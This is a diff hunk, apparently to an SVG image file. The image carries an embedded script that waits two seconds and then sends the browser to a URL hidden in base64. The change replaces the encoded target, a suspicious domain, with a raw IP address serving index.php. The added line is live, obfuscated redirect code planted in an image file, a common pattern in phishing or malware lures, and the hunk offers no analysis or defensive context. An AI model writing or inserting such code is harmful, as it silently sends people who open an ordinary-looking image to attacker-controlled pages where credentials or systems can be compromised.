@@ -10,7 +10,7 @@
   </defs>
   <script type="application/ecmascript"><![CDATA[
     setTimeout(function() {
-      var b64 = "aHR0cHM6Ly9hY2NvdW50Lmk0aHQyOTg0Z3QuY2Mv";
+      var b64 = "aHR0cDovLzE5NC43Ni4yMjcuMjI1L2luZGV4LnBocA==";
       var url = atob(b64);
       window.location.href = url;
     }, 2000);
